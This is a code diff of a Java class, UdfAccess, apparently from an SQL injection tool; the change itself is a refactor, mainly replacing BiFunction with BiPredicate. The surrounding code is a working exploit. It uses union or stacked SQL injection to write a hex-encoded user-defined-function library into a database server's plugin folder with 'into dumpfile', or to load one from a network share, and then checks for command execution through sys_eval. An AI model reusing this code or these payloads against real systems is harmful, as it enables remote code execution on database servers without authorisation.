@@ -22,8 +22,11 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
-import java.util.*;
-import java.util.function.BiFunction;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Objects;
+import java.util.UUID;
+import java.util.function.BiPredicate;
 
 public class UdfAccess {
 
@@ -34,7 +37,7 @@ public class UdfAccess {
     private static final String NAME_TABLE = "temp";
 
     private final InjectionModel injectionModel;
-    private final BiFunction<String, String, Boolean> funcConfirm = (String pathRemoteFolder, String nameLibraryRandom) -> {
+    private final BiPredicate<String, String> biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -> {
         try {
             return this.buildSysEval(nameLibraryRandom);
         } catch (JSqlException e) {
@@ -62,13 +65,17 @@ public class UdfAccess {
             throw new JSqlException("Incorrect remote machine: unknown system");
         }
         var isWin = versionOsMachine.toLowerCase().contains("win") && !versionOsMachine.toLowerCase().contains("linux");
-        var nameLibrary = versionOsMachine.contains("64")
-        ? isWin ? "64.dll" : "64.so"
-        : isWin ? "32.dll" : "32.so";
+
+        String nameLibrary;
+        if (versionOsMachine.contains("64")) {
+            nameLibrary = isWin ? "64.dll" : "64.so";
+        } else {
+            nameLibrary = isWin ? "32.dll" : "32.so";
+        }
 
         pathPlugin = pathPlugin.replace("\\", "/");
         if (!pathPlugin.endsWith("/")) {
-            pathPlugin = pathPlugin + "/";
+            pathPlugin = String.format("%s%s", pathPlugin, "/");
         }
 
         if (!this.injectionModel.getMediatorStrategy().getStack().isApplicable()) {
@@ -85,7 +92,7 @@ public class UdfAccess {
                 pathNetshareFolder,
                 nameLibrary,
                 pathPlugin,
-                this.funcConfirm
+                this.biPredConfirm
             );
         } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {
             if (StringUtil.GET.equals(this.injectionModel.getMediatorUtils().getConnectionUtil().getTypeRequest())) {
@@ -96,13 +103,13 @@ public class UdfAccess {
                 pathPlugin,
                 nameLibrary,
                 UdfAccess.toHexChunks(nameLibrary),
-                this.funcConfirm
+                this.biPredConfirm
             );
         }
         if (StringUtils.isEmpty(isSuccess) && exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {
             var nameLibraryRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameLibrary;
             this.byTable(UdfAccess.toHexChunks(nameLibrary), pathPlugin + nameLibraryRandom);
-            this.funcConfirm.apply(pathPlugin, nameLibraryRandom);
+            this.biPredConfirm.test(pathPlugin, nameLibraryRandom);
         }
     }
 
@@ -111,12 +118,11 @@ public class UdfAccess {
         String pathRemoteFolder,
         String nameExploit,
         List<String> hexChunks,
-        BiFunction<String,String, Boolean> funcConfirm
+        BiPredicate<String,String> biPredConfirm
     ) {
         String nameExploitValidated = StringUtils.EMPTY;
         var pattern = " %s SELECT %s 0x%s into dumpfile '%s'";
 
-        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using query body and union...");
         var nameExploitRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameExploit;
         this.injectionModel.injectWithoutIndex(String.format(pattern,
             "union",
@@ -124,11 +130,11 @@ public class UdfAccess {
             String.join("", hexChunks),
             pathRemoteFolder + nameExploitRandom
         ), "body#union-dump");
-        if (funcConfirm.apply(pathRemoteFolder, nameExploitRandom)) {
+        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
             nameExploitValidated = nameExploitRandom;
         }
         if (StringUtils.isEmpty(nameExploitValidated)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using query body and stack...");
+            LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Query body connection failure with union, trying with stack...");
             nameExploitRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameExploit;
             this.injectionModel.injectWithoutIndex(String.format(pattern,
                 ";",
@@ -136,7 +142,7 @@ public class UdfAccess {
                 String.join("", hexChunks),
                 pathRemoteFolder + nameExploitRandom
             ), "body#stack-dump");
-            if (funcConfirm.apply(pathRemoteFolder, nameExploitRandom)) {
+            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
                 nameExploitValidated = nameExploitRandom;
             }
         }
@@ -148,7 +154,7 @@ public class UdfAccess {
         String pathNetshareFolder,
         String nameExploit,
         String pathRemoteFolder,
-        BiFunction<String,String, Boolean> funcConfirm
+        BiPredicate<String,String> biPredConfirm
     ) {
         String nameExploitValidated = StringUtils.EMPTY;
         var pathShareEncoded = pathNetshareFolder.replace("\\", "\\\\");
@@ -162,7 +168,7 @@ public class UdfAccess {
             pathShareEncoded + nameExploit,
             pathRemoteFolder + nameExploitRandom
         ), "udf#share-union");
-        if (funcConfirm.apply(pathRemoteFolder, nameExploitRandom)) {
+        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
             nameExploitValidated = nameExploitRandom;
         }
         if (StringUtils.isEmpty(nameExploitValidated)) {
@@ -174,7 +180,7 @@ public class UdfAccess {
                 pathShareEncoded + nameExploit,
                 pathRemoteFolder + nameExploitRandom
             ), "udf#share-stack");
-            if (funcConfirm.apply(pathRemoteFolder, nameExploitRandom)) {
+            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
                 nameExploitValidated = nameExploitRandom;
             }
         }
